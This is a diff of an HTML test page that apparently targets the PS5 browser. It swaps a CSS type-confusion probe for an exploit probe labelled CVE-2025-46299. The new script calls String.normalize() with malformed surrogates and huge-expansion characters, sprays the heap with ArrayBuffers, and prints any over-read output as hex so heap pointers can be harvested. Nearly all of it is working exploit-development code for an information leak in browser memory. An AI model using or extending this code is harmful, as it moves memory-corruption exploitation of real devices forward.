@@ -2,50 +2,141 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>PS5 CSSParser Type Confusion Test</title>
+<title>PS5 CVE-2025-46299 - normalize() Info Leak</title>
 </head>
 <body>
 <pre id="log" style="white-space:pre-wrap; word-break:break-all; background:#111; color:#0F0; padding:10px;"></pre>
 <script>
 const L = s => { document.getElementById('log').textContent += s + '\n'; };
 
-const sheet = new CSSStyleSheet();
+L('[*] Starting CVE-2025-46299 String.normalize() Info Leak test...');
 
-// Test 1: Integer
-sheet.insertRule(`@font-face { font-family: test1; src: local(123); }`);
-L('Test 1: local(123)');
-L('  cssText: ' + sheet.cssRules[0].cssText);
-L('  src: ' + sheet.cssRules[0].style.getPropertyValue('src'));
+// Function to check if a string contains uninitialized data
+function checkLeak(input, form, expectedLen) {
+    try {
+        let res = input.normalize(form);
+        
+        // If the length is larger than expected, we definitely have an overread
+        if (res.length > expectedLen) {
+            L('[!] OVERREAD DETECTED! Input length: ' + input.length + ', Expected: ' + expectedLen + ', Got: ' + res.length);
+            let hex = [];
+            for (let i = 0; i < res.length; i++) {
+                hex.push(res.charCodeAt(i).toString(16).padStart(4, '0'));
+            }
+            L('[!] Hex: ' + hex.join(' '));
+            return true;
+        }
+        
+        // Check for non-printable garbage or high-byte sequences in simple normalizations
+        // If we normalize a simple ASCII string and get non-ASCII back, it's a leak
+        if (input.match(/^[\x00-\x7F]+$/)) {
+            for (let i = 0; i < res.length; i++) {
+                let code = res.charCodeAt(i);
+                if (code > 127) {
+                    L('[!] GARBAGE DETECTED in ASCII normalization at index ' + i + ': 0x' + code.toString(16));
+                    let hex = [];
+                    for (let j = Math.max(0, i-2); j < Math.min(res.length, i+5); j++) {
+                        hex.push(res.charCodeAt(j).toString(16).padStart(4, '0'));
+                    }
+                    L('[!] Surrounding hex: ' + hex.join(' '));
+                    return true;
+                }
+            }
+        }
+    } catch (e) {
+        // Sometimes it throws, sometimes it doesn't
+    }
+    return false;
+}
 
-// Test 2: Quoted String (Control)
-sheet.insertRule(`@font-face { font-family: test2; src: local("123"); }`);
-L('\nTest 2: local("123")');
-L('  cssText: ' + sheet.cssRules[1].cssText);
-L('  src: ' + sheet.cssRules[1].style.getPropertyValue('src'));
+let leaked = false;
 
-// Test 3: Float (The alleged confusion trigger)
-sheet.insertRule(`@font-face { font-family: test3; src: local(3.544848e-304); }`);
-L('\nTest 3: local(3.544848e-304)');
-L('  cssText: ' + sheet.cssRules[2].cssText);
-L('  src: ' + sheet.cssRules[2].style.getPropertyValue('src'));
+// Vector 1: Unpaired surrogates (invalid UTF-16)
+// ICU might fail on the second pass if the string is ill-formed
+L('\n--- Vector 1: Invalid Surrogates ---');
+const badSurrogates = [
+    '\uD800',           // Lone high surrogate
+    '\uDC00',           // Lone low surrogate
+    '\uD800\uD800',     // Double high
+    'A\uD800B',         // Surrogate in middle
+    '\uD800'.repeat(100), // Many surrogates
+];
 
-// Test 4: Ident (Control)
-sheet.insertRule(`@font-face { font-family: test4; src: local(Arial); }`);
-L('\nTest 4: local(Arial)');
-L('  cssText: ' + sheet.cssRules[3].cssText);
-L('  src: ' + sheet.cssRules[3].style.getPropertyValue('src'));
+for (const str of badSurrogates) {
+    for (const form of ['NFC', 'NFD', 'NFKC', 'NFKD']) {
+        if (checkLeak(str, form, str.length)) {
+            L('[!] LEAK FOUND with bad surrogate!');
+            leaked = true;
+            break;
+        }
+    }
+    if (leaked) break;
+}
 
-// Test 5: Zero (Null pointer?)
-sheet.insertRule(`@font-face { font-family: test5; src: local(0); }`);
-L('\nTest 5: local(0)');
-L('  cssText: ' + sheet.cssRules[4].cssText);
-L('  src: ' + sheet.cssRules[4].style.getPropertyValue('src'));
+// Vector 2: Rapid allocation to leave heap pointers
+L('\n--- Vector 2: Heap Grooming + Normalize ---');
+if (!leaked) {
+    // Groom the heap with objects containing pointers
+    let spray = [];
+    for (let i = 0; i < 10000; i++) {
+        spray.push({ a: i, b: new ArrayBuffer(32) });
+    }
+    spray = null;
+    
+    // Now normalize small strings that might land in those freed slots
+    for (let i = 0; i < 1000; i++) {
+        let str = 'A' + '\u0300' + 'B'; // Simple combining char
+        if (checkLeak(str, 'NFC', 3)) {
+            L('[!] LEAK FOUND after heap grooming!');
+            leaked = true;
+            break;
+        }
+    }
+}
 
-// Test 6: Large Float
-sheet.insertRule(`@font-face { font-family: test6; src: local(1.337e-308); }`);
-L('\nTest 6: local(1.337e-308)');
-L('  cssText: ' + sheet.cssRules[5].cssText);
-L('  src: ' + sheet.cssRules[5].style.getPropertyValue('src'));
+// Vector 3: Extreme expansion strings
+L('\n--- Vector 3: Extreme Expansion ---');
+if (!leaked) {
+    // \uFDFA expands to 18 chars. If ICU misreports the length on the first pass,
+    // the second pass might underwrite the buffer.
+    const str = '\uFDFA'.repeat(256);
+    for (const form of ['NFKC', 'NFKD']) {
+        if (checkLeak(str, form, 256 * 18)) {
+            L('[!] LEAK FOUND with extreme expansion!');
+            leaked = true;
+            break;
+        }
+    }
+}
+
+// Vector 4: Mixed valid and invalid sequences
+L('\n--- Vector 4: Mixed Sequences ---');
+if (!leaked) {
+    const mixed = [
+        'A\uD800\uFDFA', // ASCII + bad surrogate + expander
+        '\u212B\uD800',  // Angstrom + bad surrogate
+        '\uFB01\uDC00\uFB03', // Ligatures + bad surrogate
+    ];
+    
+    for (const str of mixed) {
+        for (const form of ['NFC', 'NFD', 'NFKC', 'NFKD']) {
+            if (checkLeak(str, form, str.length * 2)) {
+                L('[!] LEAK FOUND with mixed sequences!');
+                leaked = true;
+                break;
+            }
+        }
+        if (leaked) break;
+    }
+}
+
+if (!leaked) {
+    L('\n[*] No immediate leak detected. The bug may require specific ICU version matching.');
+} else {
+    L('\n[+] LEAK CONFIRMED! Check the hex values above for heap pointers.');
+}
+
+L('[*] Test finished.');
 </script>
 </body>
 </html>
